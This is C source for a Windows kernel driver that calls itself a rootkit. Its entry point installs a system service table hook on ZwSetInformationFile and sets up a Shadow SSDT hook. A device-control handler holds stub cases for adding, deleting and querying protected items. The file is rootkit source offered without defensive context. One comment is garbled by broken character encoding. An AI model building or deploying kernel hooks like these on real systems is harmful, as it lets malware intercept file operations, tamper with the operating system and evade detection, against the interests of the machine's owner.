#include "RootKit.h"

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING  pRegistryPath)
{
	NTSTATUS       rtStatus      = STATUS_SUCCESS;
	PDEVICE_OBJECT pDeviceObject = NULL;
	ULONG		   i			 = 0;
	UNICODE_STRING strDeviceName;
	UNICODE_STRING strSymbolLinkName;

	KdPrint(("==>RootKit DriverEntry !\n"));

	RtlInitUnicodeString(&strDeviceName, DEVICE_NAME_PROCESS);
	RtlInitUnicodeString(&strSymbolLinkName, SYMBOLINK_NAME_PROCESS);

	for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriverObject->MajorFunction[i]					= Dispatch;
	}

	pDriverObject->MajorFunction[IRP_MJ_CREATE]		    = Create; 
	pDriverObject->MajorFunction[IRP_MJ_CLOSE]			= Close;
	pDriverObject->MajorFunction[IRP_MJ_READ]			= Read;
	pDriverObject->MajorFunction[IRP_MJ_WRITE]			= Write;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;
	pDriverObject->DriverUnload							= DriverUnload;

	rtStatus = IoCreateDevice(pDriverObject, 0, &strDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);

	if (!NT_SUCCESS(rtStatus))
	{
		return rtStatus;
	}
	if (!pDeviceObject)
	{
		return STATUS_UNEXPECTED_IO_ERROR;
	}

	pDeviceObject->Flags               |= DO_DIRECT_IO;
	pDeviceObject->AlignmentRequirement = FILE_WORD_ALIGNMENT;
	pDeviceObject->Flags               &= ~DO_DEVICE_INITIALIZING;
	rtStatus                            = IoCreateSymbolicLink(&strSymbolLinkName, &strDeviceName);

	if (!InitSSDTHook())
	{
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	// InstallSSDTHook((ULONG)ZwReadFile,(ULONG)HookNtReadFile);
	InstallSSDTHook((ULONG)ZwSetInformationFile,(ULONG)HookNtSetInformationFile);

	if (!InitShadowHook())
	{
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	KdPrint(("<==RootKit DriverEntry !\n"));

	return rtStatus;
}

void DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	UNICODE_STRING strSymbolLinkName;

	KdPrint(("==>RootKit DriverUnload !\n"));

	RtlInitUnicodeString(&strSymbolLinkName, SYMBOLINK_NAME_PROCESS);
	IoDeleteSymbolicLink(&strSymbolLinkName);
	IoDeleteDevice(pDriverObject->DeviceObject);

	// TODO:½â³ý Hook

	// UnInstallSSDTHook((ULONG)ZwReadFile);
	UnInstallSSDTHook((ULONG)ZwSetInformationFile);

	KdPrint(("<==RootKit DriverUnload !\n"));
}

NTSTATUS Create(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	pIrp->IoStatus.Status      = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return pIrp->IoStatus.Status;
}

NTSTATUS Close(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	pIrp->IoStatus.Status      = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return pIrp->IoStatus.Status;
}


NTSTATUS Read(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS rtStatus = STATUS_NOT_SUPPORTED;

	return rtStatus;
}

NTSTATUS Write(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS rtStatus = STATUS_NOT_SUPPORTED;

	return rtStatus;
}

NTSTATUS Dispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	pIrp->IoStatus.Status      = STATUS_NOT_SUPPORTED;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return pIrp->IoStatus.Status;
}

NTSTATUS IoControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS           rtStatus  = STATUS_SUCCESS;
	PCHAR              pInBuffer = (PCHAR)pIrp->AssociatedIrp.SystemBuffer;
	PIO_STACK_LOCATION pStack    = IoGetCurrentIrpStackLocation(pIrp);
	ULONG              uCtrlCode = pStack->Parameters.DeviceIoControl.IoControlCode;

	switch(uCtrlCode)
	{
	case IO_INSERT_ADD_PROTECTED:
		break;

	case IO_INSERT_DEL_PROTECTED:
		break;

	case IO_INSERT_QUE_PROTECTED:
		break;

	default:
		{
			rtStatus = STATUS_INVALID_VARIANT;
			break;
		}
	}

	pIrp->IoStatus.Status      = rtStatus;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	
	return rtStatus;
}
